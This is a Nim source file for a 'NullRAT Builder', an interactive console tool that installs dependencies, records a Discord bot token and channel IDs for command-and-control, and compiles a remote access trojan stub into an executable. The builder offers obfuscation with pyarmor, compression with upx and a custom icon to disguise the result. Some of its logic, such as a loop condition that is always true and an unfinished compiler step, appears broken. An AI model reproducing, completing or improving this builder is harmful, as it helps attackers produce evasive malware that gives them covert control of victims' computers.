import std/terminal
import std/os
import std/browsers
import std/osproc
import std/[strutils, strformat]

proc cls() = 
    discard execShellCmd("cls")

discard execShellCmd("title NullRAT Builder");
discard execShellCmd("chcp 65001");
cls()
discard execShellCmd("mode con: cols=80 lines=29");

proc cleanWorkingDir() =
    echo ""
    var dirrr = getAppDir();
    setCurrentDir(dirrr);
    echo getCurrentDir();
    if dirExists(absolutePath("NullRAT")):
        createDir("NullRAT2")
        moveFile(absolutePath("NullRAT" / "custom_icon.ico"), dirrr / "NullRAT2" / "custom_icon.ico")
        moveFile(absolutePath("NullRAT" / "RAT.py"), dirrr / "NullRAT2"    / "RAT.py")
        moveDir(absolutePath("NullRAT" / "modules"), dirrr / "NullRAT2" / "modules")
        moveDir(absolutePath("NullRAT" / "upx"), dirrr / "NullRAT2" / "upx")
        # check existing variables
        if fileExists(absolutePath("NullRAT" / "Variables.py")):
            var inp: char
            while inp != 'Y' or inp != 'y' or inp != 'N' or inp != 'n':
                echo "Existing Variables file found! Preserve? (y/N)"
                inp = getch()
                if inp == 'Y' or inp == 'y':
                    moveFile(absolutePath("NullRAT" / "Variables.py"), dirrr / "NullRAT2" / "Variables.py")
        removeDir("NullRAT")
        moveDir(dirrr / "NullRAT2", dirrr / "NullRAT")
    removeFile("AIO.bat")
    removeFile("AIO_Legacy.bat")
        
    # remove git stuff if downloaded from source
    echo "Remove git files? (y/N)"
    var inpu: char = getch()
    if inpu == 'y' or inpu == 'Y':
        removeDir(".git")
        removeFile("README.md")
        removeFile("Getting Variables.md")
        removeFile(".gitignore")

    removeFile("RAT.exe")
    removeDir("build")
    removeDir("dist")        
    
    cls()
    
proc printName() = 
    cls()
    echo ""
    stdout.styledWriteLine(fgRed, "  ███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗  █████╗ ████████╗")
    stdout.styledWriteLine(fgRed, "  ████╗  ██║██║   ██║██║     ██║     ██╔══██╗██╔══██╗╚══██╔══╝")
    stdout.styledWriteLine(fgRed, "  ██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝███████║   ██║")
    stdout.styledWriteLine(fgRed, "  ██║╚██╗██║██║   ██║██║     ██║     ██╔══██╗██╔══██║   ██║")
    stdout.styledWriteLine(fgRed, "  ██║ ╚████║╚██████╔╝███████╗███████╗██║  ██║██║  ██║   ██║")
    stdout.styledWriteLine(fgRed, "  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝")
    stdout.styledWriteLine(fgRed, "  =========================================================")
    echo ""

proc compiler(): int = 
    printName()
    var dirr = getAppDir()
    setCurrentDir(dirr / "NullRAT")
    echo ""
    
    stdout.styledWriteLine({styleBright}, "  >> Stub Compiler <<")
    echo ""
    var obfuscate: bool
    var compress: bool
    var icon: bool
    
    stdout.styledWriteLine({styleBright}, "Do you want to obfuscate the executable? (Y/n)")
    var input: char = getch()
    if input == 'N' or input == 'n': obfuscate = false
    else: obfuscate = true
    
    stdout.styledWriteLine({styleBright}, "Do you want to compress the executable? (Y/n)")
    input = getch()
    if input == 'N' or input == 'n': compress = false
    else: compress = true
    
    stdout.styledWriteLine({styleBright}, "Do you want to set a custom icon? (y/N)")
    input = getch()
    var iconPath: string
    if input == 'Y' or input == 'y': 
        icon = true
        echo "Enter custom icon (.ico file) path:"
        iconPath = readLine(stdin);
    else: icon = false

    printName()
    echo ""
    echo "All options selected: "
    echo "---------------------"
    if obfuscate: echo "Executable will be obfuscated (w/ pyarmor)"
    if compress: echo "Executable will be compressed (w/ upx)"
    if icon: 
        echo "Executable will have custom icon."
        echo "Path: ", iconPath
    echo ""
    stdout.styledWriteLine({styleBright}, "Is this information correct? (Y/n)")
    input = getch()
    if input == 'N' or input == 'n':
        echo "- Information marked incorrect! Aborting..."
        sleep(1000)
        return 0
    else:
        stdout.styledWriteLine(fgCyan, "- Compiling using selected settings...") 
        stdout.styledWriteLine(fgCyan, "- Checking pyinstaller")
        echo wherePy = execCmdEx("where pyinstaller")
    
proc variablesCreator() = 
    printName()
    var dirr = getAppDir()
    setCurrentDir(dirr / "NullRAT")
    echo ""
    
    stdout.styledWriteLine({styleBright}, "  >> Variables Creator <<")
    if fileExists("Variables.py"):
        echo "\n- Existing Variables file discovered!"
        echo "\nStored information\n------------------"
        let EnF = readFile("Variables.py")
        echo EnF
        stdout.styledWriteLine({styleBright}, "Is this information correct? (Y/n)")
        var input: char = getch()
        if input == 'N' or input == 'n':
            echo "- Information marked incorrect! Continuing..."
            sleep(1000)
            printName()
        else:
            echo "- Information marked correct. Preserving..."
            sleep(1000)
            if compiler() == 0:
                return 

    echo "-----------\nTo know how to obtain the variables,\nCheck 'Getting Variables.md' in NullRAT Github\n-----------"
    stdout.styledWriteLine({styleBright}, "\n[1] Please enter the Discord bot token: ")
    var token = readLine(stdin);
    stdout.styledWriteLine({styleBright}, "[2] Please enter the Server ID: ")
    var serverID = readLine(stdin)
    stdout.styledWriteLine({styleBright}, "[3] Please enter the Notification channel ID: ")
    var notificationID = readLine(stdin)
    
    let lines = [
        "# This file was auto-generated by NullRAT Builder. DO NOT EDIT!",
        fmt"bot_token = ""{token}""",
        "notification_channel = " & notificationID,
        "server_ids = [" & serverID & "]"
    ]
    
    printName()
    stdout.styledWriteLine({styleBright}, "  >> Variables Creator <<")
    echo ""
    echo "Obtained information:"
    echo "---------------------"
    for line in lines:
        if "#" in line: continue
        echo line
    echo ""
    stdout.styledWriteLine({styleBright}, "Is this information correct? (Y/n)")
    var input: char = getch()
    if input == 'N' or input == 'n':
        echo "- Aborted! Returning to main menu..."
        sleep(2000)
    else:
        echo "- Information marked correct. Writing..."
        removeFile("Variables.py")
        let f = open("Variables.py", fmWrite)
        defer: f.close()
        
        for line in lines:
            f.writeLine(line)    
            
        stdout.styledWriteLine({styleBright}, "- Written information to disk!")
        echo ""
        stdout.styledWriteLine({styleBright}, "Moving on to compiler...")
        sleep(3000)
        if compiler() == 0:
            return
            
proc packageInstaller() = 
    printName()
    stdout.styledWriteLine({styleBright}, "  >> Dependencies Installer <<")
    echo ""
    stdout.styledWriteLine({styleBright}, "[1] Checking for Python...")
    var status: int = execShellCmd("python --version")
    var status2: int = execShellCmd("py --version")
    if status == 0 or status2 == 0:
        echo "- Python installed!"
        echo ""
        stdout.styledWriteLine({styleBright}, "[2] Checking if packages already installed...")
        var result = execCmdEx("pip freeze")
        var allInstalled: bool = true
        if result.exitCode != 0:
            echo "pip command failed to execute!!"
        else:
            if "pyinstaller==4.10" notin result.output or "virtualenv" notin result.output or "disnake" notin result.output or "requests" notin result.output or "pyarmor" notin result.output or "mss" notin result.output:
                echo "Some dependencies are not installed!"
                allInstalled = false
            
            if allInstalled:
                echo "- All packages installed and detected!\n\nProceeding on with variables creation..."
                sleep(3000)
                variablesCreator()
            else:
                stdout.styledWriteLine({styleBright}, "[3] Installing/Updating dependencies...")
                var res = execShellCmd("pip install pyinstaller==4.10 virtualenv aiohttp disnake requests mss pyarmor")
                if res == 0:
                    echo "========================"
                    stdout.styledWriteLine({styleBright}, "All Installed!\nMoving to variables creation...")
                    sleep(2000)
                    variablesCreator()

    else:
        stdout.styledWriteLine({styleBright}, "- Python not installed!\n\nWould you like to download the recommended python installer? (Y/n): ")
        var input: char = getch();
        if input == 'N' or input == 'n':
            echo "NullRAT Builder cannot continue otherwise!!! Exiting..."
            sleep(2000)
            quit(1)
        else:
            openDefaultBrowser("https://www.python.org/ftp/python/3.8.10/python-3.8.10.exe")
            echo ""
            stdout.styledWriteLine({styleBright}, "Your browser should start downloading the installer already.")
            stdout.styledWriteLine({styleBright}, "Since we do not support automatic installation of python,")
            stdout.styledWriteLine({styleBright}, "you have to run the installer manually.")
            stdout.styledWriteLine({styleBright}, "After running, please tick 'Install for All Users'")
            stdout.styledWriteLine({styleBright}, "and 'Add Python 3.8 to PATH', then Install Now")
            stdout.styledWriteLine({styleBright}, "After installing, check if everything is functional")
            stdout.styledWriteLine({styleBright}, "by running NullRAT builder again.")
            echo ""
            stdout.styledWriteLine({styleBright}, "Returning to menu in 30 seconds...")
            sleep(30000)
            return
    
proc mainMenu() =
    printName();
    stdout.styledWriteLine({styleBright}, "  >> NullRAT Builder v1.1 <<")
    echo ""
    stdout.styledWriteLine({styleBright}, " Press any key to continue, E to exit and C to clear working directory...")
    var input: char = getch();
    if input == 'E' or input == 'e':
        quit(0)
    elif input == 'C' or input == 'c':
        cleanWorkingDir()
    else:
        packageInstaller()
        
while true:
    mainMenu();
#stdout.styledWriteLine(fgRed, "")